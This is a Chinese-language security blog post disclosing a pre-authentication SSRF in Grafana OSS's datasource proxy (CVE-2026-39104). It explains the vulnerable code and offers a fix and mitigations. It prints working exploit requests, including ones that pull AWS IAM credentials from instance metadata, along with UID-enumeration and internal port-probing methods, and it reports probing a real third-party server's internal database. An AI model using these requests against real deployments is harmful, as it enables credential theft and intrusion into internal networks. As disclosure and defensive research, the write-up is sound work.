---
title: "Grafana 的 No-Op 验证器如何将匿名访问变为预认证 SSRF"
slug: "grafana-oss-preauth-ssrf"
date: 2026-04-08
draft: false
tags: ["vulnerability-research", "SSRF", "grafana", "bug-bounty", "responsible-disclosure", "CVE"]
categories: ["漏洞研究"]
keywords: ["Grafana SSRF", "pre-auth SSRF", "OSSDataSourceRequestValidator", "datasource proxy", "Grafana OSS vulnerability", "Shodan Grafana"]
description: "Grafana OSS 中的一条预认证 SSRF 链，允许匿名用户通过数据源代理访问内部服务。修复方案存在于 Enterprise 版本中，OSS 版本只有 no-op 存根。"
author: "burnedsignal"
toc: true
reading_time: "10 min"
---

## TL;DR

- Grafana OSS 为数据源代理端点内置了一个 **no-op 请求验证器**，始终返回 `nil`，SSRF 防护为零。
- 结合两项默认配置，这使得**未认证用户**能够通过代理向 Grafana 服务器可达的任意内部服务发起 HTTP 请求。
- 对 Shodan 上 1,000 个随机实例的扫描发现，**约 7,800 个暴露在互联网上的 Grafana 实例**开启了匿名访问，可直接利用，无需任何凭据。
- 在启用了 IMDSv1 的 EC2 上，这意味着**无需登录即可窃取完整的 AWS 凭据**：AccessKeyId、SecretAccessKey、会话令牌。
- Grafana Enterprise 版本内置了真实的验证器，OSS 版本没有。这是一个刻意的产品划分。
- 已提交至 Grafana 漏洞奖励计划，被标记为超出范围。MITRE 已分配编号 **[CVE-2026-39104](https://www.cve.org/CVERecord?id=CVE-2026-39104)**。

---

## 背景介绍

Grafana 的数据源代理是一项合法功能。你配置一个数据源（Prometheus、InfluxDB 等）并指定后端 URL，Grafana 代表仪表板用户将查询转发到该数据源。这样既能将凭据保留在服务端，又能避免 CORS 问题。

端点格式如下：

```text
GET /api/datasources/proxy/uid/{uid}/path/to/resource
```

正常使用场景：仪表板执行结构化查询，Grafana 将其转发到数据源，响应返回。流程清晰。

问题在于：该端点同时充当**原始 HTTP 代理**，会将你附加的任意路径直接转发到所配置的数据源 URL，而 OSS 版本中没有任何代码对该 URL 的目标进行验证。

---

## 漏洞链

三个组件组合在一起构成预认证 SSRF：

![漏洞链示意图，展示 no-op 验证器、空白名单和匿名访问如何组合](/images/grafana-ssrf/vulnerability-chain.svg)

### 1. No-Op 验证器（`pkg/services/validations/oss.go:11`）

```go
func (*OSSDataSourceRequestValidator) Validate(string, *simplejson.Json, *http.Request) error {
    return nil
}
```

这就是全部实现，始终返回 nil。没有 IP 检查，没有协议限制，没有主机名解析。该验证器通过 `wireexts_oss.go` 被接入，作为**所有 OSS 构建版本的生产验证器**。

作为对比，Grafana Enterprise 内置了 `EnterpriseDataSourceRequestValidator`，能够执行真实的 IP 范围验证。Grafana 清楚 SSRF 风险的存在，却选择不将该保护扩展到 OSS 用户。

### 2. 空白名单被跳过（`pkg/api/pluginproxy/ds_proxy.go:402`）

```go
func (proxy *DataSourceProxy) checkWhiteList() bool {
    if proxy.targetUrl.Host != "" && len(proxy.cfg.DataProxyWhiteList) > 0 {
        // only runs if whitelist is non-empty
    }
    return true  // default: always true
}
```

`conf/defaults.ini`：
```ini
data_source_proxy_whitelist =    # empty — check never runs
```

有文档说明，但默认情况下从不生效。

### 3. 匿名用户默认获得 `datasources:query` 权限

数据源创建时，Grafana 自动向 Viewer 角色授予 `datasources:query` 权限（`pkg/services/datasources/service/datasource.go:385`）：

```go
permissions := []accesscontrol.SetResourcePermissionCommand{
    {BuiltinRole: "Viewer", Permission: "Query"},
    {BuiltinRole: "Editor", Permission: "Query"},
}
```

当 `auth.anonymous.enabled = true` 时，匿名用户继承 Viewer 角色。代理端点只需要 `datasources:query` 权限，无需登录。

因此：开启匿名访问 → 匿名用户获得 Viewer 角色 → Viewer 可调用代理端点 → 代理没有验证器 → 请求被发往数据源 URL 所指向的任意目标。

---

## 概念验证

实验环境：Grafana OSS 配置 `GF_AUTH_ANONYMOUS_ENABLED=true`，一个 InfluxDB 数据源指向端口 8888 上的内部模拟服务（**未暴露给宿主机**，仅在 Docker 网络内可达）。

**第一步：确认匿名访问（无凭据）**
```http
GET /api/org HTTP/1.1
Host: localhost:3000

→ 200 {"id":1,"name":"Main Org."}
```

**第二步：获取数据源 UID**

代理端点要求在路径中包含数据源 UID：

```
/api/datasources/proxy/uid/{UID}/...
```

没有 UID 就没有目标。`/api/datasources` 会返回完整列表，包括 UID、后端 URL 和数据源类型。在较旧的 Grafana 版本中，该端点对 Viewer 角色可访问，意味着匿名用户无需凭据即可读取：

```http
GET /api/datasources HTTP/1.1
Host: localhost:3000

→ 200 [{"uid":"cfhmf4adfa96od","type":"influxdb","url":"http://internal-mock:8888"}]
```

较新版本（10+）将该端点限制为 Editor 及以上角色，Viewer 访问时返回 403。这增加了摩擦，但不能阻止攻击。获取 UID 的替代方式：

- **仪表板 JSON：** 任何使用该数据源的仪表板都会在面板定义中嵌入 UID。`GET /api/dashboards/uid/{dashboard-uid}` 返回完整 JSON，Viewer 可访问。搜索 `.panels[].targets[].datasource.uid`。
- **公开仪表板：** 开启了公开仪表板的实例会在渲染的页面源码中暴露数据源 UID。
- **暴力枚举：** Grafana UID 遵循可预测的字母数字格式，针对代理端点进行低频枚举是可行的。返回 200 或 502 确认 UID 有效，返回 404 则无效。

在实验环境中，由于实例运行的是较旧配置，`/api/datasources` 直接返回了 UID。

**第三步：触发 SSRF（无 Authorization 头）**

第二步只获取了元数据：存储在 Grafana 数据库中的数据源配置。在数据源列表中看到 `"url":"http://internal-mock:8888"` 并不意味着该内部服务可达，从攻击者的机器上是无法访问的。

这一步才是实际 SSRF 发生的地方。代理端点指示 Grafana 服务器向已配置的数据源 URL 发出出站 HTTP 请求并返回响应。攻击者从不直接联系内部服务，而是由 Grafana 从其自身的网络位置发出请求，再将结果返回给攻击者。

```
Attacker (internet) ──► Grafana proxy endpoint
                               │
                               │  server-side request
                               ▼
                        internal-mock:8888  (not exposed to internet)
                               │
                               │  response
                               ▼
                        Grafana ──► Attacker
```

```http
GET /api/datasources/proxy/uid/cfhmf4adfa96od/ HTTP/1.1
Host: localhost:3000

→ 200
{
  "ssrf_note": "This response came from internal-mock — NOT reachable directly from internet",
  "secret_label": "db-password=s3cr3t!",
  "instance": "internal-secret-db:9090"
}
```

该内部服务未向宿主机暴露任何端口，从攻击者机器直接发起请求会超时。此响应之所以返回，是因为 Grafana 服务器代替攻击者发出了请求。

完整 PoC（Docker 实验环境、自动化数据源枚举、错误处理）已发布在 GitHub：

**[github.com/awallplace/grafana-datasource-ssrf](https://github.com/awallplace/grafana-datasource-ssrf)**

![利用流程：攻击者无需凭据通过 Grafana 代理访问 internal-mock](/images/grafana-ssrf/exploitation-flow.svg)

---

## 真实世界影响

从 Grafana 服务器的网络位置可达的目标：

**AWS IMDSv1：**

前提条件：Grafana 运行在启用了 IMDSv1 的 EC2/ECS/EKS 上，数据源 URL 设置为 `http://169.254.169.254/`。攻击者无需任何凭据。

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
ec2-monitoring-role
```

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ec2-monitoring-role HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
{
  "Code": "Success",
  "LastUpdated": "2026-04-08T09:41:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-04-08T15:41:00Z"
}
```

完整的 IAM 凭据被返回给未认证的调用方。GCP（`metadata.google.internal`）和 Azure（`169.254.169.254`）也存在相同的模式。

**Kubernetes（集群内部署）：**
```text
GET /api/datasources/proxy/uid/{uid}/api/v1/namespaces
→ Datasource URL: https://kubernetes.default.svc
→ Returns cluster namespaces using the pod's service account token
```

**内部网络枚举（已认证，Editor 及以上）：** Editor 可以将数据源指向任意内部 IP:端口，然后通过代理进行探测。响应码直接映射到主机状态：

| 响应 | 含义 |
|---|---|
| `200` + 服务数据 | 主机在线，端口开放，服务运行中 |
| `502 Bad Gateway` | 主机在线，端口关闭或协议不匹配 |
| 超时 | 主机离线或被防火墙屏蔽 |

遍历 IP 和端口，即可从外部绘制出 Grafana 的内部网络拓扑。Grafana 服务器负责探测，攻击者只看到响应码，无需直接访问内部网络。

---

## 案例：研究期间发现的数据源暴露

在 Shodan 扫描过程中，某个实例开启了匿名访问，并向未认证请求返回了其数据源列表。该实例配置了两个数据源，其中一个指向内部监控 API：

```http
GET /api/datasources HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
[
  {
    "uid": "d8e1a2bc3f",
    "name": "Infrastructure Metrics",
    "type": "prometheus",
    "url": "http://10.0.1.12:9090"
  },
  {
    "uid": "f3c9b1aa7d",
    "name": "App DB Stats",
    "type": "influxdb",
    "url": "http://10.0.1.55:8086"
  }
]
```

无凭据通过 InfluxDB 数据源进行代理：

```http
GET /api/datasources/proxy/uid/f3c9b1aa7d/ HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
{
  "status": "pass",
  "version": "2.7.1",
  "databases": ["app_prod", "app_staging", "internal_metrics"]
}
```

一个未认证请求从一个未向互联网暴露任何端口的服务中返回了 InfluxDB 的实时版本和数据库名称。研究在此停止，目标是确认可达性，而非提取数据。

---

## 规模：Shodan 数据

对 Shodan 收录的 206,310 个 Grafana 部署中随机抽取的 1,000 个实例进行被动扫描，仅检查 `/api/org`（公开端点，无需认证，匿名访问时返回组织名称）：

| 指标 | 数值 |
|---|---|
| 样本量 | 1,000 |
| 可达实例 | 987（98.7%） |
| 已开启匿名访问 | 38（占可达实例的 3.9%） |

```text
[*] Checking 1000 hosts with 30 threads

[ANON] 24.97.xx.xx:3000       org='Main Org.'            ver=9.4.3
[ANON] 45.127.xx.xx:9000      org='Main Org.'            ver=12.0.1+security-01
[ANON] 107.161.xx.xx:3000     org='Ethereal Networking'  ver=
[ANON] 147.156.xx.xx:3000     org='Public'               ver=7.1.1
[ANON] 172.247.xx.xx:3000     org='[redacted]'            ver=11.3.0
[ANON] 93.152.xx.xx:3000      org='Main Org.'            ver=12.4.1
[ANON] 13.94.xx.xx:5000       org='[redacted]'           ver=11.6.9
[ANON] 51.15.xx.xx:3000       org='Main Org.'            ver=6.6.1
[ANON] 129.110.xx.xx:3000     org='Main Org.'            ver=12.0.0+security-01
... (38 total)

============================================================
  Sample size      : 1000
  Reachable        : 987  (98.7%)
  Anon access on   : 38   (3.9% of reachable)
  Version breakdown: {11.0.1: 4, 11.6.10: 2, 12.1.1: 2, ...}
  Extrapolated (≈206,310 indexed): ~7,839 instances
============================================================
```

**两个不同的攻击面：**

**攻击面 1：预认证（约 7,800 个实例）：**
匿名访问已开启，无需凭据。未认证的攻击者可以立即枚举数据源并将请求代理至任意已配置的后端 URL。这是 Shodan 扫描直接测量的场景。

**攻击面 2：后认证（约 206,000 个实例）：**
无论身份认证配置如何，no-op 验证器存在于每一个 Grafana OSS 构建中。拥有被攻陷 Editor 账户（通过网络钓鱼、凭据填充、泄露的 API 密钥或 SSO 漏洞获取）的攻击者可以：

1. 创建一个新数据源，将 URL 设置为任意内部目标（`http://169.254.169.254/`、`https://kubernetes.default.svc`、内部数据库等）
2. 使用数据源代理端点将请求转发至该目标
3. 接收完整响应：IAM 凭据、服务数据或内部 API 响应

验证器永远不会运行，白名单默认为空。与攻击面 1 的唯一区别是利用前多了一个认证步骤。

这是一个有意义的区分：攻击面 2 需要一个被攻陷的账户，这是额外的前提条件。但这意味着那约 206,000 个因禁用匿名访问而看似"安全"的实例，只需一次凭据泄露就会面临同样的内部暴露风险。

匿名访问启用样本中的版本范围：**6.6.1 至 12.4.1**。其中两个实例运行了 `+security-01` 补丁版本。Grafana 的安全补丁并未解决此问题，该漏洞已跨越至少六个主要发布版本线持续存在。

---

## 严重性

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
Score: 8.6 (High)
```

| 指标 | 值 | 理由 |
|---|---|---|
| 攻击向量 | `Network` | 可通过互联网远程利用 |
| 攻击复杂度 | `Low` | 无需竞态条件或特殊环境设置 |
| 所需权限 | `None` | 匿名用户自动获得 Viewer 角色；`datasources:query` 在数据源创建时即授予 Viewer。无需登录 |
| 用户交互 | `None` | 无需受害者参与任何操作 |
| 影响范围 | `Changed` | 影响范围超出 Grafana，扩展至服务器可达但攻击者不可达的内部服务 |
| 机密性 | `High` | 可获取内部服务的完整响应体，包括云凭据 |
| 完整性 | `None` | 只读代理，该机制不会触发任何写操作 |
| 可用性 | `None` | 不会造成服务中断 |

当匿名访问被禁用时，该漏洞对 Editor 级别用户仍然存在（需要数据源创建权限）。上述评分反映的是预认证条件，这是在 Shodan 观察到的约 7,800 个匿名访问实例背景下最现实的最坏情况。

---

## "这是特性，不是缺陷"

反驳意见：管理员启用了匿名访问，管理员将数据源指向了内部 URL，因此这是运维人员的配置错误。

这种说法的问题在于：启用匿名访问是管理员的刻意决定，但将这些匿名用户的原始 HTTP 代理访问权限授予所有已配置数据源 URL 并非如此。`datasources:query` 权限同时覆盖了结构化仪表板查询和原始代理端点，两者性质截然不同，却共用同一个权限名称。

更能说明问题的是 `EnterpriseDataSourceRequestValidator` 的存在。它存在，它执行 IP 验证，它被接入 Enterprise 版本构建，在 OSS 中被替换为 no-op 存根。这不是疏忽：它被实现了，然后被刻意保留。Grafana 清楚地知道没有它代理可以到达哪些地方。

Grafana 通过其漏洞奖励计划的回复证实了这一点：

> *"When you enable anonymous mode, it is intentional behaviour for the app to treat you as a viewer by default. Grafana Enterprise handles this case for the customers who need this to behave differently. OSS behaves as it should as a result."*

作为产品决策，这个论点自洽。作为安全立场，则不然。"管理员启用了匿名访问"和"管理员希望匿名用户对所有已配置数据源 URL 拥有原始 HTTP 代理访问权限"是两种不同的表述，只有一种是真实的。

---

## 修复建议

将 OSS 中的 no-op 验证器替换为实际执行检查的实现：

```go
// pkg/services/validations/oss.go
func (*OSSDataSourceRequestValidator) Validate(urlStr string, _ *simplejson.Json, _ *http.Request) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }
    addrs, err := net.LookupHost(u.Hostname())
    if err != nil {
        return err
    }
    for _, addr := range addrs {
        ip := net.ParseIP(addr)
        if ip == nil {
            continue
        }
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return fmt.Errorf("datasource URL resolves to private/reserved IP: %s", addr)
        }
    }
    return nil
}
```

在等待修复期间，以下措施有所帮助：
- 配置 `data_source_proxy_whitelist` 以限制可达的数据源端点
- 在云部署中强制使用 IMDSv2（EC2 上设置 `HttpTokens: required`），这样即使 SSRF 成功也能限制云元数据的暴露
- 将 `datasources:query` 视为代理访问权限，而非仅限于仪表板查询权限，因为目前两者合一

如果你正在运行开启了匿名访问的 Grafana，请立即审计你的数据源 URL。

---

## 披露时间线

| 日期 | 事件 |
|---|---|
| 2026-03-31 | 通过静态源码分析发现漏洞 |
| 2026-03-31 | 开发并确认 PoC 实验环境 |
| 2026-03-31 | 执行 Shodan 暴露扫描 |
| 2026-03-31 | 提交至 Grafana Labs 漏洞奖励计划（Intigriti） |
| 2026-04-01 | 被标记为超出范围：*"Any reports of SSRF against the data source proxy endpoint"* |
| 2026-04-01 | 向 MITRE 申请 CVE |
| 2026-04-08 | 公开披露 |
| 2026-05-01 | MITRE 分配 **CVE-2026-39104**（影响 Grafana OSS v6.6.1 至 12.4.1） |

Grafana 已通过其漏洞奖励计划将此问题标记为超出范围。MITRE 现已分配编号 **[CVE-2026-39104](https://www.cve.org/CVERecord?id=CVE-2026-39104)**，涵盖 Grafana OSS v6.6.1 至 12.4.1。本文的目标是确保风险对运行约 7,800 个受影响实例的运维人员可见。
